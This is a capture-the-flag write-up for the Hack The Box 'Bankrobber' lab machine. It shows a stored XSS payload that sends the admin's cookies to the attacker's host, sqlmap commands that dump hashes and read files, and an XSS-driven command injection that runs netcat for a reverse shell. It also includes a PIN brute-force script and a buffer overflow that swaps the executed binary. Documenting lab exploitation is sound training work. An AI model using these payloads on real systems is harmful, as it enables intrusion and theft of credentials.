---
layout: single
title: Bankrobber - Hack The Box
excerpt: "Bankrobber is a web app box with a simple XSS and SQL injection that we have to exploit in order to get the source code of the application and discover a command injection vulnerability in the backdoor checker page that's only reachable from localhost. By using the XSS to make a local request to that page, we can get land a shell on the box. To get root, we exploit a buffer in an application to override the name of the binary launched by the program."
date: 2020-03-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-bankrobber/bankrobber_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - xss
  - sqli
  - ssfr
  - command injection
  - brute force
  - buffer overflow
---

![](/assets/images/htb-writeup-bankrobber/bankrobber_logo.png)

Bankrobber is a web app box with a simple XSS and SQL injection that we have to exploit in order to get the source code of the application and discover a command injection vulnerability in the backdoor checker page that's only reachable from localhost. By using the XSS to make a local request to that page, we can get land a shell on the box. To get root, we exploit a buffer in an application to override the name of the binary launched by the program.

## Summary

- The Transfer E-coin form contains an XSS vulnerability in the comment field
- We can grab the administrator username and password and then log in to the site
- There's an SQL injection in the "Search users" function which we can use to dump the database and read files from the box
- Using the XSS, we can turn it into an SSRF and get access to the "Backdoorchecker" page which is only accessible by the localhost
- After getting the Backdoorchecker source code with the SQLi, we find a command injection vulnerability
- Using the injection vulnerability, we can pop a shell with netcat and get the first flag
- There's a custom binary running a banking app on port 910 which we bruteforce to get the PIN
- Once we have the PIN, we exploit a buffer overflow to execute an arbitrary program and get a shell as root

## Portscan

```
root@kali:~/htb/bankrobber# nmap -T4 -sC -sV -p- 10.10.10.154
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-21 15:01 EDT
Nmap scan report for bankrobber.htb (10.10.10.154)
Host is up (0.052s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m06s, deviation: 0s, median: 1h00m06s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-09-21T20:03:12
|_  start_date: 2019-09-21T20:00:52

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.62 seconds
```

## SMB

SMB is not reachable through null or guest sessions:

```
root@kali:~/htb/bankrobber# smbmap -u invalid -H 10.10.10.154
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[!] Authentication error on 10.10.10.154
root@kali:~/htb/bankrobber# smbmap -u '' -H 10.10.10.154
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[!] Authentication error on 10.10.10.154
```

## MySQL

MySQL is not accessible remotely:

```
root@kali:~/htb/bankrobber# mysql -h 10.10.10.154 -u root -p
Enter password:

ERROR 1130 (HY000): Host '10.10.14.19' is not allowed to connect to this MariaDB server
```

## Web enumeration

The website is a web application that allows users to buy E-coin cryptocurrency.

![](/assets/images/htb-writeup-bankrobber/web1.png)

I can create an account by following the Register link.

![](/assets/images/htb-writeup-bankrobber/web2.png)

After logging in I have the option of transferring funds to another user and to leave a comment.

![](/assets/images/htb-writeup-bankrobber/web3.png)

When I transfer funds, I get a popup message saying the admin will review the transaction. This screams XSS to me because there's a comment field that the admin will see and if it's not sanitized correctly I'll be able to inject javascript code in his browser session.

![](/assets/images/htb-writeup-bankrobber/web4.png)

## Exploiting the XSS

My XSS payload in the comments field is very simple: `<script src="http://10.10.14.19/xss.js"></script>`

This'll make the admin browser download a javascript file from my machine and execute its code.

The `xss.js` will steal the session cookies from the admin and send them to my webserver.

```javascript
function pwn() {
    var img = document.createElement("img");
    img.src = "http://10.10.14.19/xss?=" + document.cookie;
    document.body.appendChild(img);
}
pwn();
```

After a few minutes I get two connections. The first downloads the javascript payload and the second one is the connection from the script with the admin cookies.

![](/assets/images/htb-writeup-bankrobber/xss1.png)

The cookies contains the admin's username and password Base64 encoded:

- Username: `admin`
- Password: `Hopelessromantic`

## Exploiting the SQLi

Once logged in as administrator, I see that there's a list of transactions, a search function for users and a backdoorchecker.

![](/assets/images/htb-writeup-bankrobber/web5.png)

The backdoorchecker is only accessible from the localhost because it returns the following message when I try any commands: `It's only allowed to access this function from localhost (::1). This is due to the recent hack attempts on our server.`

The search function contains an obvious SQL injection since I get the following error after sending a single quote: `There is a problem with your SQL syntax`

This should be easy to exploit with sqlmap.

I'll save one of the POST request from the search field in a `search.req` file:

```
POST /admin/search.php HTTP/1.1
Host: bankrobber.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://bankrobber.htb/admin/
Content-type: application/x-www-form-urlencoded
Content-Length: 6
Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
Connection: close
```

Then I run `sqlmap -r search.req` to start testing for injection points. As expected it quickly finds the injection point:

![](/assets/images/htb-writeup-bankrobber/sql1.png)

## Exploring with sqlmap

First I'll check which user the webapp is running as on the MySQL server: `sqlmap -r search.req --current-user`

```
current user: 'root@localhost'
```

I'm root so I should be able to get the passwords hashes with: `sqlmap -r search.req --passwords`

```
[*] pma [1]:
    password hash: NULL
[*] root [1]:
    password hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
```

A quick search online shows the password for this hash is: `Welkom1!`

![](/assets/images/htb-writeup-bankrobber/hash1.png)

Nice but that doesn't really help me for now. Next I'll get the source code of various PHP files in the web app. This is a Windows box running Apache and PHP so I'm probably looking at a XAMPP stack. A quick search online shows the default base directory for XAMPP is: `C:/xampp/htdocs`

I can use the `--file-read` flag in sqlmap to read files:

`sqlmap -r search.req --file-read '/xampp/htdocs/index.php'`
`sqlmap -r search.req --file-read '/xampp/htdocs/admin/search.php'`
`sqlmap -r search.req --file-read '/xampp/htdocs/admin/backdoorchecker.php'`

The `backdoorchecker.php` is interesting because it contains an injection vulnerability in the system() function. There's some filtering done on the provided `cmd` parameter: it has to start with `dir` and can't contain `$(` or `&`. But that's not enough to prevent injecting commands. Source code shown below:

```php
<?php
include('../link.php');
include('auth.php');

$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));
$bad 	  = array('$(','&');
$good 	  = "ls";

if(strtolower(substr(PHP_OS,0,3)) == "win"){
    $good = "dir";
}

if($username == "admin" && $password == "Hopelessromantic"){
    if(isset($_POST['cmd'])){
        // FILTER ESCAPE CHARS
        foreach($bad as $char){
            if(strpos($_POST['cmd'],$char) !== false){
                die("You're not allowed to do that.");
            }
        }
        // CHECK IF THE FIRST 2 CHARS ARE LS
        if(substr($_POST['cmd'], 0,strlen($good)) != $good){
            die("It's only allowed to use the $good command");
        }

        if($_SERVER['REMOTE_ADDR'] == "::1"){
            system($_POST['cmd']);
        } else{
            echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
        }
    }
} else{
    echo "You are not allowed to use this function!";
}
?>
```

## Turning the XSS into an SSRF

As I found earlier I can't reach the `backdoorchecker.php` file from my own machine but I can use the same XSS to turn it into a SSRF. I'll need to change my javascript payload to generate a POST request to the backdoor checker page with the right parameters. After some trial an error I found that `dir|\\\\10.10.14.19\\test\\nc.exe 10.10.14.19 7000 -e cmd.exe"` payload works to execute netcat over SMB and get a shell.

```javascript
function pwn() {
    document.cookie = "id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D";
    var uri ="/admin/backdoorchecker.php";
    xhr = new XMLHttpRequest();
    xhr.open("POST", uri, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("cmd=dir|\\\\10.10.14.19\\test\\nc.exe 10.10.14.19 7000 -e cmd.exe");
}
pwn();
```

![](/assets/images/htb-writeup-bankrobber/shell1.png)

```
C:\xampp\htdocs\admin>type c:\users\cortin\desktop\user.txt
f6353466...
```

## Privesc using bank transfer application

There's something odd running on port 910...

![](/assets/images/htb-writeup-bankrobber/root1.png)

I also see a `bankv2.exe` file in the system root directory but I can't read it.

![](/assets/images/htb-writeup-bankrobber/root2.png)

I generated an metasploit reverse shell payload, uploaded it then created a port forward for this port:

```
meterpreter > portfwd add -l 910 -p 910 -r 127.0.0.1
[*] Local TCP relay created: :910 <-> 127.0.0.1:910
```

I can reach the application now on port 910 but I don't have a valid PIN:

![](/assets/images/htb-writeup-bankrobber/root3.png)

I tried checking for buffer overflows but couldn't crash the program so I likely have to brute force the PIN first. I made a quick script to brute force the PIN:

```python
#!/usr/bin/python

from pwn import *
import time
import sys

i = int(sys.argv[1])
j = int(sys.argv[2])
while True:
    m = ""
    if i < j:
        pin = str(i).zfill(4)
        p = remote("127.0.0.1", 910)
        try:
            p.recvuntil("[$]", timeout=30)
            p.sendline("%s" % pin)
        except EOFError:
            print("Retry on %d" % i)
            continue
        try:
            m = p.recvline(timeout=10)
            print m
        except EOFError:
            print("Retry on %d" % i)
            continue
        if "Access denied, disconnecting client" not in m:
            print m
            exit(0)
        print "Doing ... " + str(i)
        i = i + 1
    else:
        print("We're done.")
        exit(0)
    p.close()
```

Thankfully the PIN was a low number so I didn't have to search the entire PIN space: `0021`

![](/assets/images/htb-writeup-bankrobber/brute.png)

When I log in with the PIN, I can transfer coins and I see that the `transfer.exe` command is executed:

![](/assets/images/htb-writeup-bankrobber/bof1.png)

If I send a large string I can see there's a buffer overflow present in the program since I no longer see the `transfer.exe` and it's replaced by some characters that submitted in the amount field.

![](/assets/images/htb-writeup-bankrobber/bof2.png)

The offset is 32 bytes as shown below:

![](/assets/images/htb-writeup-bankrobber/bof3.png)

Note that whatever is overflowing from the amount variable gets into the name of the program that is executed after. So I can simply replace the executed program by a meterpreter payload I uploaded:

![](/assets/images/htb-writeup-bankrobber/bof4.png)

My meterpreter gets executed and I get a shell as NT AUTHORITY\SYSTEM

![](/assets/images/htb-writeup-bankrobber/bof5.png)

```
meterpreter > cat /users/admin/desktop/root.txt
aa65d8e...
```